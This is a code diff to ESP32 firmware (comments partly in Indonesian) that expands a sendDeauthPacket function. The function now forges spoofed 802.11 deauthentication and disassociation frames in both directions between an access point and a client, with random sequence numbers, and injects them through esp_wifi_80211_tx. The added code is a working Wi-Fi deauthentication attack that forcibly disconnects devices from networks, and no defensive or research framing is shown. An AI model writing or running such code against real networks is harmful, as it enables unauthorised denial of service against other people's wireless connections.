@@ -91,17 +91,42 @@ void WiFi_Utils::sendDeauthPacket(const uint8_t* bssid, const uint8_t* client_ma
     /* 22 - 23 */ 0x00, 0x00,                         // Sequence Number
     /* 24 - 25 */ 0x07, 0x00                          // Reason Code: 7 = Class 3 frame received from nonassociated STA
   };
-
+  // --- Paket 1: Deauth dari AP ke Klien ---
+  packet[0] = 0xC0; // Type: Management, Subtype: Deauthentication
   // Salin MAC address ke dalam paket
   memcpy(&packet[4], client_mac, 6);  // Tujuan adalah klien
   memcpy(&packet[10], bssid, 6);      // Sumber adalah AP
   memcpy(&packet[16], bssid, 6);      // BSSID adalah AP
-
+  packet[22] = random(256); // Random sequence number
   // Kirim paket menggunakan fungsi level rendah ESP-IDF
   // esp_wifi_80211_tx(interface, buffer, panjang, tidak di-enqueue)
   esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
   
   delay(1); // Beri jeda singkat agar tidak membebani buffer
+
+  // --- Paket 2: Deauth dari Klien ke AP ---
+  memcpy(&packet[4], bssid, 6);      // Destination = AP
+  memcpy(&packet[10], client_mac, 6); // Source = Client
+  memcpy(&packet[16], bssid, 6);     // BSSID = AP
+  packet[22] = random(256); // Random sequence number
+  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
+  delay(1);
+
+  // --- Paket 3: Disassociation dari AP ke Klien ---
+  packet[0] = 0xA0; // Type: Management, Subtype: Disassociation
+  memcpy(&packet[4], client_mac, 6);  // Destination = Client
+  memcpy(&packet[10], bssid, 6);     // Source = AP
+  memcpy(&packet[16], bssid, 6);     // BSSID = AP
+  packet[22] = random(256); // Random sequence number
+  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
+  delay(1);
+
+  // --- Paket 4: Disassociation dari Klien ke AP ---
+  memcpy(&packet[4], bssid, 6);      // Destination = AP
+  memcpy(&packet[10], client_mac, 6); // Source = Client
+  memcpy(&packet[16], bssid, 6);     // BSSID = AP
+  packet[22] = random(256); // Random sequence number
+  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
 }
 
 // Dapatkan MAC address saat ini
